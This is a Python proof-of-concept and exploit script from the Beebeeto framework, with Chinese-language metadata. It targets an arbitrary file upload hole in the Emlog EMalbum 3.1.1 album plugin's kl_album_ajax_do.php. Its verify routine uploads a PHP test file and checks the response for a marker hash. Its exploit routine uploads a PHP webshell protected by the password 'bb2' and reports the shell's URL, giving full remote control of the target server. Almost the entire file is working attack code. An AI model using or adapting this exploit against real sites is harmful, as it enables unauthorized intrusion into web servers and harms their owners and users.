#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import requests

from baseframe import BaseFrame

from utils.payload.webshell import PhpShell
from utils.payload.webshell import PhpVerify


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0029',
            'name': 'Emlog EMalbum 3.1.1 /kl_album_ajax_do.php 任意文件上传漏洞 POC & Exploit',
            'author': 'tmp',
            'create_date': '2015-02-04',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Emlog',
            'vul_version': '3.1.1',
            'type': 'File Upload',
            'tag': ['Emlog插件漏洞', 'Emlog GETSHELL', '/kl_album_ajax_do.php', 'php'],
            'desc': '''
                    Emlog相册插件 /content/plugins/kl_album/kl_album_ajax_do.php 验证不严谨导致可被任意上传文件。
                    ''',
            'references': ['http://www.leavesongs.com/PENETRATION/emlog-important-plugin-getshell.html',
            ]
        },
    }


    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        verify_url = '%s/content/plugins/kl_album/kl_album_ajax_do.php' % url
        php = PhpVerify().get_content()
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
            print '[*] Upload File: ' + php
        verify_file = {'Filedata': ('v%27.php', php), 'album': (None, '11111')}
        content = requests.post(verify_url, files=verify_file).content
        try:
            file_path = re.search("..(/content.*?\.php)", content).group(1)
        except:
            return args
        # check
        if args['options']['verbose']:
            print '[*] Checking...'
        check_content = requests.post(url+file_path).content
        if '202cb962ac59075b964b07152d234b70' in check_content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args


    @classmethod
    def exploit(cls, args):
        url = args['options']['target']
        verify_url = '%s/content/plugins/kl_album/kl_album_ajax_do.php' % url
        php = PhpShell(pwd='bb2').get_content()
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
            print '[*] Upload Shell: ' + php
        verify_file = {'Filedata': ('v%27.php', php), 'album': (None, '11111')}
        content = requests.post(verify_url, files=verify_file).content
        try:
            file_path = re.search("..(/content.*?\.php)", content).group(1)
        except:
            return args
        # check
        if args['options']['verbose']:
            print '[*] Checking...'
        check_content = requests.post(url+file_path).content
        if '202cb962ac59075b964b07152d234b70' in check_content:
            args['success'] = True
            args['poc_ret']['webshell'] = url+file_path
            args['poc_ret']['password'] = 'bb2'
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())